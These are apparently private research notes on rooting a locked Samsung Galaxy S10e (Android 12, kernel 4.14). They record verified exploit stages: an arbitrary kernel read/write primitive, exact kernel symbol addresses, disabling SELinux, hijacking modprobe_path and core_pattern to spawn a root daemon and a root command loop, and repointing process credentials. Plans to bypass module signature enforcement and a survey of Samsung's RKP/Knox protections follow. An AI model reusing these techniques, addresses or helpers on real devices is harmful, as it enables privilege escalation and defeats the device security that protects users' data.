# KSU / root findings (session notes — beyond0q, SM-G970W, 4.14.190)

Target: `4.14.190-23725627-abG970WVLU9IXE1` (Android 12, non-GKI, locked bootloader).
Kernel ELF + full symbol table available: `~/ghostlock/kernel/vmlinux.elf`,
`~/ghostlock/kernel/kallsyms_fixed.txt`.

## 1. Exploit primitives — status
| Stage | Result |
|---|---|
| PI walk + fops redirect (mode 4) | ✅ works, reproducibly (log: `ssopt post paint walked=1`, `cfi fops_before == fake_fops`) |
| configfs arbitrary R/W (`physrw: configfs-only`) | ✅ (read+write arbitrary kernel addr via `configfs_write_once`) |
| SELinux off (write `selinux_enforcing=0`) | ✅ |
| UMH root (`--stop-after=umh`) | ✅ **runs** `dnroot` as root (`retval=0`) **iff the payload was "warmed"** (exec once from shell → fscrypt `i_crypt_info` cached, else `-ENOKEY`) |
| cred path (`--stop-after=cred`) | ❌ wedges → reboot |
| KernelSU late-load (LKM) | ⛔ blocked by `CONFIG_MODULE_SIG_FORCE=y` |

### UMH caveat (kernel-spawned task I/O)
The UMH child runs as **uid 0** but its **writes produce no data**: `/data` files are
created but **0 bytes**; socket writes from its daemon never reached the client.
A daemon in a *normal* process works (verified: `[daemon] accepted … uid=2000 … sh -i`),
so it is the UMH-spawned environment that is write-crippled (blocked on *content*
writes; a modprobe-spawned task, see §3, DID print a root prompt to a socket).

## 2. Key kernel symbols (image base `KIMAGE_TEXT_BASE = 0xffffff8008000000`)
`kallsyms_fixed.txt` (exact, device-matched):
```
modprobe_path  0xffffff800a9b93c0   core_pattern 0xffffff800a9e6120
commit_creds   0xffffff800805e6d4   prepare_kernel_cred 0xffffff800805ee5c
init_cred      0xffffff800a20e0d0   init_task 0xffffff800a9a9780
sys_call_table 0xffffff8009781000   set_memory_rw 0xffffff800802661c
selinux_enforcing 0xffffff800adc8ce8 (off 0x2DC8CE8 → repo target.h)  ✓
modules_disabled 0xffffff800ad349c8
__arm64_sys_*   load_module 0xffffff80080fc804   mod_verify_sig 0xffffff80080fcc6c
```
`sig_enforce` is **NOT** a named symbol and `/sys/module/kernel/parameters/sig_enforce`
does **not exist** on this build.

## 3. modprobe_path → ROOT (WORKS)
PoC wired into `src/core/fops.c` (env `MP_PATH`): right after the redirect verify it
writes `MP_PATH` into `modprobe_path` (via `data_addr`, verified by read-back) **and
writes 0 to `selinux_enforcing`**. Trigger = exec a file with an unknown binary magic
(`\xff\xff\xff\xff`) → kernel `request_module("binfmt-ffff")` → `call_modprobe()` runs
`modprobe_path` **as root** (`call_usermodehelper`, real path).

**Critical requirement:** SELinux must be **permissive first** — while enforcing, the
LNK `security_kernel_module_request` hook blocks `request_module`, so no helper runs.
```
[run] modprobe_path @... <- '/data/local/tmp/mphelper' wr=25 rd=63 rb='...' selinux_off=1
[trigger] /data/local/tmp/pwn2
[check]  15032 root  mphelper -q -- binfmt-ffff
         tcp 0 0 127.0.0.1:2223 LISTEN
[connect] sh: can't find tty fd …  :/ #     <-- root shell prompt (uid 0)
```
Helpers: `tools/mphelper.c` (root daemon, `rootshell.c`) + `pwn2` (4×0xFF trigger).
Run: `env … FORCE_REDIRECT=1 SLIDE=0x… MP_PATH=/data/local/tmp/mphelper \
      ./glA17 --stop-after=verify --log=info`  then exec `pwn2`.

### Open items
- Daemon command I/O flaky on the socket in the modprobe env (prompt ok, `id` output
  not seen) — `mphelper` now does read-one-line + `sh -c` (built, not re-tested).
- UPDATE (see §6): `/data` **content** writes DO work from the real
  `call_usermodehelper` (the modprobe helper wrote `mphelper uid=0 …`). The
  empty-file problem was only the *fake work_struct* UMH path.

## 4. Building KernelSU (from ROM source `~/ghostlock/src/g9700`)
- Build with **gcc** (override the Samsung clang wrapper):
  `make -C $S O=$S/out ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- \
        CC=aarch64-linux-gnu-gcc LD=aarch64-linux-gnu-ld modules_prepare`
  (`python2` present; `.cmd` files show the author also used `aarch64-linux-gnu-gcc`).
- `hello.ko` builds and its **vermagic matches** the device
  (`4.14.190 SMP preempt mod_unload modversions aarch64`).
- **No `Module.symvers` needed**: `kernel/module.c:check_version` tolerates an empty
  `__versions` section (warn-once → return 1).
- `CONFIG_MODVERSIONS=y`, **`CONFIG_MODULE_SIG_FORCE=y` + `MODULE_SIG_ALL=y`** →
  unsigned `hello.ko` **did not load** (UMH root ran `insmod` → `/proc/modules` empty).
- Full kernel build with gcc 14 **fails** (4.14 vs gcc 14) → no `System.map`.
- ⇒ To load KernelSU: patch the sig check — either the `sig_enforce` byte (address TBD;
  not in kallsyms) or the `module_sig_check`/`mod_verify_sig` **code** (needs
  `set_memory_rw` → needs a kernel call primitive; `CONFIG_STRICT_KERNEL_RWX=y`).
- Vendored sources in `refs/kernelsu/` (BakaSU `kernel/` + `userspace/` + ROM configs).
  Full kernel source copied to `refs/rom-4.14-full/` (**gitignored**; NTFS case-collision
  makes a full copy lossy).

## 6. Arbitrary kernel R/W — capabilities exercised (data side)

Primitive after the walk: redirect `/dev/ashmem` fops → configfs arbitrary
read/write via `configfs_read_once` / `configfs_write_once`.
**Gotcha:** in `configfs-only` mode the `pipe_*` helpers are NOT set up — use the
`configfs_*` primitives. Hooks wired in `src/core/fops.c` (env `MP_PATH`).

| # | Capability | Mechanism | Verified |
|---|---|---|---|
| 1 | SELinux off | write 0 → `selinux_enforcing` | ✅ |
| 2 | `modprobe_path` → root helper | write path; trigger bad-magic exec | ✅ root daemon (`call_usermodehelper`) |
| 3 | `core_pattern` → root helper | write `|/data/local/tmp/helper` | written ✅ (crash trigger not tuned) |
| 4 | `kptr_restrict=0` | write 0 → `kptr_restrict` | ⚠️ partial (names visible, addrs hashed) |
| 5 | **cred repoint → any process root** | task-list walk (configfs reads), write `task->real_cred`/`cred` = `init_cred` | ✅ uid 0 |
| 6 | full caps / user_ns | implied by #5 (`init_cred` = root + full caps) | ✅ (via #5) |

Key facts:
- **`call_usermodehelper` (real) DOES write `/data`** — the earlier "kernel-spawned
  task can't write /data" was specific to the *fake work_struct* UMH. So a
  `modprobe_path` root process is a fully functional root (reads/writes `/data`).
- `task->cred` for a live task is a per-task slot; repointing it does not affect
  other tasks sharing the old cred object.
- Use the **canonical** `init_cred` (`canon_addr(INIT_CRED)`) as the new pointer.
- The earlier `cred`-path **wedge came from the W2/pselect write**
  (`do_one_write(task+TASK_CRED_OFF, "W2", 2)`), NOT from touching cred — an
  8-byte **configfs** write to `real_cred`/`cred` is stable.
- `find_task_by_tgid()` in `root.c` uses `pipe_read64` (broken in configfs-only);
  the configfs-based walk in `repoint_task_cred()` finds tasks fine.

## 7. Frontier: code / rodata (still not reachable)
`CONFIG_STRICT_KERNEL_RWX=y` → `.text`/`.rodata` are read-only. Data R/W covers
everything above, but patching code (`module_sig_check`, `sys_call_table`) or
calling `set_memory_rw` needs either (a) editing the kernel page tables via R/W
(+ TLB flush problem) or (b) a kernel call primitive. This is the remaining hard
step for KernelSU-LKM (`CONFIG_MODULE_SIG_FORCE=y`).

## 9. Usable root channel (VERIFIED)
The `modprobe_path` helper runs a **file-driven root command loop** (see
`tools/mphelper.c`): write a command to `/data/local/tmp/rcmd`; the helper
executes `sh -c <cmd>` as root and writes output to `/data/local/tmp/rout`.
```
$ echo id > /data/local/tmp/rcmd; sleep 3; cat /data/local/tmp/rout
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```
Root-only paths work (`ls -l /data/adb` succeeds; the shell gets EACCES).
This is a stable, usable full-root channel without touching code/rodata.

### What "full root" gives (probe_root.sh)
| Item | Result |
|---|---|
| `id` | `uid=0(root) gid=0(root) groups=0(root)` |
| SELinux ctx | `u:r:kernel:s0` (init_cred) ; `getenforce` → Permissive |
| caps | `CapEff=0000003fffffffff` (full) |
| read root-only | `/data/adb`, `/data/misc`, `/data/system`, `/proc/1/exe` ✓ |
| kptr_restrict | 0 (but `/proc/kallsyms` addrs still **hashed** even as root) |
| **create NEW file in /data** | ❌ `Required key not available` (**-ENOKEY**, fscrypt) |
| write EXISTING (warmed) file | ✓ (inode `i_crypt_info` already cached) |

So: full root for privileges/reads/exec, **except creating new `/data` files**
(fscrypt keyring). Fix option: repoint `cred->session_keyring` to a keyring that
holds the fscrypt key (or pre-warm each target inode).

## 8. Repo changes this session
- `main.c` `write_root_script()`: KMI fallback `AVER="android$(getprop ro.build.version.release)"`
  (Samsung `uname -r` has no `androidNN`, old code produced `KMI=-4.14`).
- `target.h`: `MODPROBE_PATH_OFF 0x029B93C0`, `CORE_PATTERN_OFF 0x029E6120`.
- `fops.c`: `MP_PATH` hook — write `modprobe_path` + `selinux_enforcing=0` +
  `kptr_restrict=0` + `core_pattern`, and (env `CRED_TGID`) `repoint_task_cred`.
- `root.c`: `repoint_task_cred()` (configfs task-list walk + cred pointer write).
- `primitives/rootshell.c`: daemon handler (diagnostics + read-one-line/`sh -c`).
- `tools/mphelper.c`, `tools/_build_mphelper.sh`, `runner.sh`.

## 10. Samsung protection stack vs "root" (survey)
Kernel knobs / symbols / device state:
- RKP: `CONFIG_UH_RKP`, `RKP_KDP`, `RKP_NS_PROT`, `RKP_DMAP_PROT`, `RKP_CFP`(+JOPP/ROPP) —
  partly **EL3/TEE**. Symbols: `rkp_*`, `security_integrity_current`.
- `CONFIG_SECURITY_DEFEX` (Samsung exec LSM), `CONFIG_FIVE`, `CONFIG_DM_VERITY`(+FEC).
- `CONFIG_MODULE_SIG_FORCE`, `CONFIG_STRICT_KERNEL_RWX`, `CONFIG_KNOX_NCM`, `ro.config.knox=v30`.
- Device: `ro.boot.verifiedbootstate=green`, `vbmeta.device_state=locked`, `flash.locked=1`,
  `warranty_bit=0`, `sys.oem_unlock_allowed=0`, `ro.oem_unlock_supported=1`.

Why uid 0 does NOT break them — the protections are not at ring0:
- **Above the kernel (TEE/EL3)**: RKP/KNOX/Keymaster — the kernel cannot touch them, and
  RKP *watches* the kernel. Observed panic: `RKP CRED PROTECTION VIOLATION
  PC:security_integrity_current+0x448` (reset log `/data/log/power_off_reset_reason.txt`)
  after a cred repoint. => do NOT modify `cred`/task_struct/page tables.
- **Before the kernel (bootloader + AVB/SVB)**: verifies the boot image every boot; root
  cannot influence the next boot.
- **Enforced by ring0 itself**: STRICT_KERNEL_RWX (text RO), MODULE_SIG (unsigned module
  rejected), dm-verity (block RO), fscrypt (needs the key).
- **Unlock flag**: `oem_unlock_supported=1` but `sys.oem_unlock_allowed=0` and it is NOT
  settable even as root; `persistent` block is obfuscated and `param` has no plaintext
  OEM/KG flags => **runtime bootloader unlock infeasible** => no flashed persistence.

Achievable (runtime, data-only, RKP-safe): SELinux off, modprobe_path/core_pattern,
kptr_restrict, and **root via the modprobe helper** (uid 0, full caps) — a transient
userspace root. Not achievable: cred/keyring/page-table edits (RKP), unsigned modules,
code patches, new `/data` files (fscrypt), `/system` writes (verity), persistence.
